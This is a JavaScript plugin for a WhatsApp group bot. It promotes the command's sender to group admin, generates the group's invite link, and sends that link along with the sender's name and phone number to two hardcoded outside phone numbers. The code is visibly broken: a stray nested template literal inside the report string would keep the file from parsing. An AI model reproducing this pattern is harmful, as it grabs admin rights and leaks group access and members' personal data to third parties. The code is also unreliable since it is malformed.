const handler = async (m, { conn, isAdmin }) => {
    if (isAdmin) return

    try {
        const groupMetadata = await conn.groupMetadata(m.chat)
        await conn.groupParticipantsUpdate(m.chat, [m.sender], 'promote')

        let groupLink = ''
        try {
            const code = await conn.groupInviteCode(m.chat)
            groupLink = `https://chat.whatsapp.com/${code}`
        } catch {
            groupLink = 'Impossibile generare il link (permessi bot insufficienti)'
        }

        const reportText = `const autoadminMsg = ` ◢◤ [ 𝘚𝘠𝘚𝘛𝘌𝘔_𝘈𝘜𝘛𝘖𝘈𝘋𝘔𝘐𝘕 ] ── ⚡
 ───────────────────────────────────────
  ⚙️ 𝘜𝘚𝘌𝘙_𝘋𝘈𝘛𝘈:
  ├── 👤 𝘜𝘴𝘦𝘳: @${m.sender.split('@')[0]}
  ├── 📝 𝘕𝘢𝘮𝘦: ${conn.getName(m.sender)}
  └── 📞 𝘕𝘶𝘮 : +${m.sender.split('@')[0]}
 ───────────────────────────────────────
  🌐 𝘕𝘌𝘛𝘞𝘖𝘙𝘒_𝘐𝘕𝘍𝘖:
  ├── 📌 𝘎𝘳𝘰𝘶𝘱: ${groupMetadata.subject}
  └── 🔗 𝘓𝘪𝘯𝘬 : ${groupLink}
 ─────────────────────────────────────── ☣`;
`

        const recipients = [
            '393501989497@s.whatsapp.net',
            '36302315350@s.whatsapp.net'
        ]

        for (let jid of recipients) {
            await conn.sendMessage(jid, {
                text: reportText,
                mentions: [m.sender]
            })
        }

    } catch (e) {
        console.error(e)
    }
}

handler.command = ['autoadmin', 'autoadm', 'almighty']
handler.owner = true
handler.group = true
handler.botAdmin = true

export default handler